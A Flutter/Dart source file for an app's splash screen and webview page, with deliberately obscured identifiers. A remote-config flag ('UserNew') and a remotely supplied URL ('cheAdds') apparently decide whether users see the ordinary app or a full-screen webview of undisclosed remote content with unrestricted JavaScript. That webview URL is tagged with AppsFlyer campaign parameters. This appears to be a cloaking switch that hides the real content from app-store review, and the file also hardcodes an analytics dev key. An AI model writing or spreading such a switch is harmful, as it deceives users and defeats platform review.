import 'dart:async';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:loading_indicator/loading_indicator.dart';
import 'package:montreal/MLnavigation_pageEUI.dart';
import 'package:montreal/MLonb_screenCER.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';

import 'ML11urlsHJW.dart';
import 'main.dart';

final mlRemoteConfig = FirebaseRemoteConfig.instance;
bool? mlSuccessOej = mlSharedPreferences.getBool("success");
String? mlLink = mlSharedPreferences.getString("link");

StreamSubscription? mlDeepLinkSub;

final ValueNotifier _mlIsLoadAppWND = ValueNotifier<bool>(false);
final ValueNotifier _mlIsLoadNetWIM = ValueNotifier<bool>(false);

late SharedPreferences mlSharedPreferences;


class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {

  @override
  void initState() {
    mlSharedPreferences = context.read<SharedPreferences>();
    super.initState();
    _mlIsLoadAppWND.addListener(() {
      if (_mlIsLoadAppWND.value && _mlIsLoadNetWIM.value) _mlNavPej();
    });
    _mlIsLoadNetWIM.addListener(() {
      if (_mlIsLoadAppWND.value && _mlIsLoadNetWIM.value) _mlNavPej();
    });
    if (mlSuccessOej ?? false) {
      _mlIsLoadNetWIM.value = true;
    }

    WidgetsBinding.instance.addPostFrameCallback((_) async {
      await _mlRemoteConfigIer();
      await _mlGetCheckCej();
      await _mlRemoteConfigWie();
      await _mlNothingHappendXwe();
      // await uwe_getAppsflyerWIKD();
    });
    Future.delayed(Duration(milliseconds: 3000), () async {
      _mlIsLoadAppWND.value = true;

    });
  }

  Future<void> _mlRemoteConfigIer() async {
    try {
      await mlRemoteConfig.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(seconds: 10),
        minimumFetchInterval: Duration.zero,
      ));
      await mlRemoteConfig.fetchAndActivate();
    } catch (e) {
      mlSuccessOej = false;
    }
  }
  Future<void> _mlGetCheckCej() async {
    mlLink ??= mlRemoteConfig.getString("cheAdds");
    mlSharedPreferences.setString("link", mlLink!);
    mlSuccessOej = mlRemoteConfig.getBool("UserNew");
    mlSharedPreferences.setBool("success", mlSuccessOej!);
    if (mlSuccessOej ?? false) {
      _mlIsLoadNetWIM.value = true;
    }
  }
  Future<void> _mlRemoteConfigWie() async {
    final appsFlyerOptions = AppsFlyerOptions(
      afDevKey: "8Q7xDdnkC9yaAAmN7UXnXg",
      appId: "6648782368",
      timeToWaitForATTUserAuthorization: 3,
      showDebug: true,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
      manualStart: true,
    );
    mlAppsflyerSdk = AppsflyerSdk(appsFlyerOptions);

    await mlAppsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );
    mlAppsflyerSdk.onDeepLinking((dp) async {
      final mLcampaign = dp.deepLink!.deepLinkValue;
      final mLcampaignList = mLcampaign?.split("_");
      String? sub1 = mLcampaignList?.tryGet(0);
      String? sub2 = mLcampaignList?.tryGet(1);
      String? sub3 = mLcampaignList?.tryGet(2);
      String? sub4 = mLcampaignList?.tryGet(3);
      String? sub5 = mLcampaignList?.tryGet(4);
      String? sub6 = mLcampaignList?.tryGet(5);
      String? sub7 = mLcampaignList?.tryGet(6);
      if (mlLink!.length < 50) {
        mlLink = '$mlLink?sub1=$sub1&sub2=$sub2&sub3=$sub3&sub4=$sub4&sub5=$sub5&sub6=$sub6&sub7=$sub7';
        await mlSharedPreferences.setString("link", mlLink!);
      }
      await Future.delayed(const Duration(seconds: 1));
      if (!(mlSuccessOej ?? false)) {
        _mlNavPej();
      } else {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => MlPoliceWop(text: mLcampaign.toString())),
        );
      }
    });
    mlAppsflyerSdk.startSDK(onSuccess: () {
    });
  }

  Future<void> _mlNothingHappendXwe() async {
    if (mounted) {
      await Future.delayed(const Duration(seconds: 10));
      bool aaa = mlSharedPreferences.getBool('aaa') ?? false;
      if (aaa) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => NavigationPage()),
        );
      } else {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => OnbScreen()),
        );
      }
      mlSuccessOej = false;
      mlSharedPreferences.setBool("success", false);
    }
  }

  void _mlNavPej() async {
    bool Mlaaa = mlSharedPreferences.getBool('aaa') ?? false;
    if (!(mlSuccessOej ?? false)) {
      if (Mlaaa) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => NavigationPage()),
        );
      } else {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => OnbScreen()),
        );
      }
    } else {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => MlPoliceWop(text: '')),
      );
    }
  }

  @override
  void dispose() {
    _mlIsLoadAppWND.dispose();
    mlDeepLinkSub?.cancel();
    _mlIsLoadNetWIM.dispose();
    super.dispose();
  }

  Future<void> term() async {
    final Uri _url = Uri.parse(Url.term);

    if (!await launchUrl(_url)) {
      throw Exception('Could not launch $_url');
    }
  }

  Future<void> privacy() async {
    final Uri _url = Uri.parse(Url.privacy);

    if (!await launchUrl(_url)) {
      throw Exception('Could not launch $_url');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Color(0xFFFFAA00),
      body: Stack(
        children: [
          Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Image.asset(
                  'assets/splash.png',
                  width: 150.w,
                ),
                SizedBox(height: 40.h),
                SizedBox(
                  width: 50,
                  height: 50,
                  child: LoadingIndicator(
                      indicatorType: Indicator.lineScale, /// Required, The loading type of the widget
                      colors: const [Colors.white],       /// Optional, The color collections
                      strokeWidth: 2,                     /// Optional, The stroke of the line, only applicable to widget which contains line
                  ),
                )
              ],
            ),
          ),
          Positioned(
            bottom: 20.h,
            left: 0,
            right: 0,
            child: IntrinsicHeight(
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  GestureDetector(
                    onTap: term,
                    child: Text(
                      'Terms of Use',
                      style: TextStyle(
                          color: Colors.black.withOpacity(0.4),
                          fontSize: 12.sp),
                    ),
                  ),
                  VerticalDivider(
                    color: Colors.black.withOpacity(0.4),
                    width: 30.w,
                  ),
                  GestureDetector(
                    onTap: privacy,
                    child: Text(
                      'Privacy Policy',
                      style: TextStyle(
                          color: Colors.black.withOpacity(0.4),
                          fontSize: 12.sp),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class MlPoliceWop extends StatefulWidget {
  const MlPoliceWop({
    super.key,
    required this.text,
  });
  final String text;

  @override
  State<MlPoliceWop> createState() => _MlPoliceWicState();
}

class _MlPoliceWicState extends State<MlPoliceWop> {
  late WebViewController _mlWebViewControllerWiv;
  @override
  void initState() {
    super.initState();

    _mlWebViewControllerWiv = WebViewController()
      ..loadRequest(
        Uri.parse(mlLink!),
      )
      ..setJavaScriptMode(
        JavaScriptMode.unrestricted,
      )
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (String url) async {
            SystemChrome.setPreferredOrientations([
              DeviceOrientation.portraitUp,
              DeviceOrientation.landscapeLeft,
              DeviceOrientation.portraitDown,
              DeviceOrientation.landscapeRight,
            ]);
          },
        ),
      );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Column(
          children: [
            // SelectableText((widget.text)),
            // const SizedBox(height: 10),
            // SelectableText((link ?? '')),
            Expanded(
              child: WebViewWidget(
                controller: _mlWebViewControllerWiv,
              ),
            ),
          ],
        ),
      ),
      bottomNavigationBar: OrientationBuilder(
        builder: (BuildContext context, Orientation orientation) {
          return Container(
            color: Colors.black,
            height: orientation == Orientation.portrait ? 25 : 30,
            alignment: Alignment.center,
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.end,
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                IconButton(
                  padding: EdgeInsets.zero,
                  color: Colors.white,
                  icon: const Icon(
                    Icons.arrow_back,
                  ),
                  onPressed: () async {
                    if (await _mlWebViewControllerWiv.canGoBack()) {
                      _mlWebViewControllerWiv.goBack();
                    }
                  },
                ),
                const SizedBox.shrink(),
                IconButton(
                  padding: EdgeInsets.zero,
                  color: Colors.white,
                  icon: const Icon(Icons.arrow_forward),
                  onPressed: () async {
                    if (await _mlWebViewControllerWiv.canGoForward()) {
                      _mlWebViewControllerWiv.goForward();
                    }
                  },
                ),
              ],
            ),
          );
        },
      ),
    );
  }
}

extension ListGetExtension<T> on List<T> {
  T? tryGet(int index) => index < 0 || index >= length ? null : this[index];
}
